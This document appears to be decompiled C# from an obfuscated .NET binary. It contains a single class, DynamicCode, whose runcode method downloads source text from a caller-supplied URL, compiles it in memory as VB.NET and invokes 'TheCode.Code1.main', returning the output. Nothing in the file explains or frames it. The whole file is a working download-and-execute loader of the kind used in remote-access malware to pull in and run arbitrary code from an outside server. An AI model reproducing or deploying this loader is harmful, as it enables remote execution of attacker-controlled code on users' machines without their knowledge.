using System;
using System.CodeDom.Compiler;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace a;

[StandardModule]
internal sealed class DynamicCode
{
	public static object runcode(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		try
		{
			ICodeCompiler val = new VBCodeProvider().CreateCompiler();
			CompilerParameters val2 = new CompilerParameters();
			val2.get_ReferencedAssemblies().Add("System.dll");
			val2.get_ReferencedAssemblies().Add("System.data.dll");
			val2.get_ReferencedAssemblies().Add("System.Xml.dll");
			val2.get_ReferencedAssemblies().Add("System.Windows.Forms.dll");
			val2.get_ReferencedAssemblies().Add("Microsoft.VisualBasic.dll");
			val2.get_ReferencedAssemblies().Add("System.drawing.dll");
			val2.set_GenerateInMemory(true);
			string text = "";
			WebClient webClient = new WebClient();
			webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
			byte[] bytes = webClient.DownloadData(string_0);
			text = Encoding.ASCII.GetString(bytes);
			CompilerResults val3 = val.CompileAssemblyFromSource(val2, text);
			if (val3.get_Errors().get_HasErrors())
			{
				return "Error: Line>" + val3.get_Errors().get_Item(0).get_Line() + ", " + val3.get_Errors().get_Item(0).get_ErrorText();
			}
			Assembly compiledAssembly = val3.get_CompiledAssembly();
			object objectValue = RuntimeHelpers.GetObjectValue(compiledAssembly.CreateInstance("TheCode.Code1"));
			if (objectValue != null)
			{
				object[] args = new object[1] { "" };
				try
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue.GetType().InvokeMember("main", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), args));
					return objectValue2.ToString();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					object result = "Error:" + ex2.Message;
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return "Unable to load class.";
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			object result = "Error:" + ex4.Message;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
